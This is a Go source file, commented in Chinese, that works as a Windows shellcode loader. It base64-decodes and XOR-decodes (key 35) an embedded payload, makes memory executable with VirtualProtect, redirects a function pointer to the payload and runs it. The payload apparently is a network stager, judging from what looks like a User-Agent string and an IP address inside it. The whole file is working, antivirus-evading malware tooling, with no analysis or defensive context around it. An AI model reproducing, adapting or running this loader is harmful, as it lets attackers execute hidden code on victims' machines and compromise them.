package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

//申请kernel32.dll的api-VirtualProtect
var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

//向该api中传入参数，
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	fmt.Println(ret)
}


func Run(sc []byte){
	//定义一个函数
	f := func() {}

	var oldfperms uint32 //定义一个可写的地址
	//将函数f所在内存区域设置为可执行模式
	VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms))

	//将shellcode的地址传入函数f的地址，这时候函数f的地址就是shellcode的地址
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32 //定义一个可写的地址

	VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms))

	f()
}


func XorDecode(b64body string) []byte {

	shellCodeB64, _ := base64.StdEncoding.DecodeString(b64body)
 	length := len(shellCodeB64)

	for i := 0; i < length; i++ {
			shellCodeB64[i] = shellCodeB64[i] ^35
	}

	hex_string_data := hex.EncodeToString(shellCodeB64)

	shellcodeHex,_ := hex.DecodeString(hex_string_data)
	return shellcodeHex
}

func main() {

	b64string := "32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim3MjIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDG0aSk4jwGDHTrAz/y/YKr2FwPQXq3LVnuAzpJPE1uJMYrP69p2bslMdrNcM/jl9e1IugXqLgBo/r8RajeCkRpu61bEIZytYAAb21kmB4CN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMSEw0TGAN0Sk1HTFRQA213AxUNEhgDdGx0FRcYA3dRSkdGTVcMFQ0TGANuYnBzCi4pI+n5yLTbP6/sgM+KJlabhLdlxsBHdvwBz/vgfF4TBnUuUnlp8fTiF08YotpdM5pHT6lv/KBpyoj7g2VuW5Yr37WcFQMJj5lQJ8yGc6MkyJDt5QQb8j+t2o2AuFkPy7ko3iUPPS/I/h/HCwr5qCUAnzIXSNOfWYli5QTruSMNM5MnJ0fFKu2ytDNjsQRcXc7xASS1hOsbMqhxraG8bTWoyfoJEbrA8uHqTmmh0dtiTczJvsNytnadzFypQCZ4uA0er3Wkd/tBjLM867izm0V9ajvk54MjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BIaEQ0SFRsNERINEhUSIzpKg64="

	sc := XorDecode(b64string)
	Run(sc)

}

